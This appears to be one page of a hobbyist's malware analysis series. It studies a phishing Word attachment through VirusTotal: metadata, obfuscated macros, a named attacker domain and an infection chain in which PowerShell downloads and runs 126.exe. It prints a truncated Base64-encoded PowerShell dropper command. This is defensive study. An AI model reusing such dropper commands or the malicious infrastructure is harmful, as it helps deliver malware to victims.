---
layout: default
---

### Initial analysis

The hero of my project was file PL_95054906484_68262954.doc which was attached in phishing mail received by my friend.

Because it is Microsoft Office Word file I also installed Microsoft Office on my Windows machine. What is more, based on my knowledge I assumed that I had to deal with Office macro and dropper written in PowerShell.  

For a good start, I used VirusTotal.

![](../assets/images/emotet_re_project/virustotal_1.png)

Most of the AV Engines detected threat. By analysing tags I confirmed my previous assumptions. Additionally tags showed the that code could be obfuscated.

![](../assets/images/emotet_re_project/virustotal_2.png)

In DETAILS I found metadata like author, time of file creation and software which was used for its creation.

![](../assets/images/emotet_re_project/virustotal_7.png)

But more interesting were information about the OLE objects:

![](../assets/images/emotet_re_project/virustotal_3.png)

![](../assets/images/emotet_re_project/virustotal_4.png)

And macros:

![](../assets/images/emotet_re_project/virustotal_5.png)

![](../assets/images/emotet_re_project/virustotal_6.png)

This also confirmed that the code was obfuscated in order to make analysis harder.

In RELATIONS I gained informations about attacker infrastructure.

There, I found three domains from which the dropper would probably try to download "proper malware".

![](../assets/images/emotet_re_project/virustotal_8.png)

pieceofpassion.net domain was registered by proxy which allow for anonimity. 

![](../assets/images/emotet_re_project/virustotal_9.png)

In BEHAVIOUR I found more specific information about what the malware does.

Domain requests:

![](../assets/images/emotet_re_project/virustotal_10.png)

Register modifications:

![](../assets/images/emotet_re_project/virustotal_11.png)

Created process:

![](../assets/images/emotet_re_project/virustotal_12.png)

PowerShell instructions:

![](../assets/images/emotet_re_project/virustotal_13.png)

This sequence was particularly interesting:

```powershell
    powershell -enco PAAjACAAaAB0AHQAcABzADoALwAvAHcAdwB3AC4AbQBpAGMAcgBvAHMAbwBmAHQALgBjAG8AbQAvACAAIwA+ACAAJABSAGUAZgBpAG4AZQBkAF8AUABsAGEAcwB0AGkAYwBfAFMAb…
```
                
That is PowerShell script encoded by Base64.

The 126.exe file is also worth noticing. It appeared in process tree. I supposed that it was the resulted file which had created by dropper module.

Created process and services:

![](../assets/images/emotet_re_project/virustotal_15.png)

Used DLL files:

![](../assets/images/emotet_re_project/virustotal_14.png)

### Summary

Based on information that I gained from VirusTotal I created small steps list which illustrates what the mysterious doc file could do:  

1.  After running a doc file in MS Word editor, the macro is processed. (Propably we have to allow macro execution)
2.  Macro spawns cmd process which starts encoded PowerShell script.
3.  PowerShell script downloads content of malware which is saved in 126.exe file.
4.  Then PowerShell script runs 126.exe and creates service sizetablet.exe. 

But what the file 126.exe and the created service really does? I wasn't able to affirm that in this stage of analysis but I thought that it could be a ransomware.

#### Table of content:

1.  [Environment configuration](environment-configuration.html)
2.  [Initial analysis](initial-analysis.html)
3.  [Macro analysis](macro-analysis.html)
4.  [Dropper analysis](dropper-analysis.html)
5.  [Detonation](detonation.html)
7.  [Domain analysis](domain-analysis.html)
8.  [Detonation ver. 2](detonation-v2.html)
9.  [Summary](summary.html)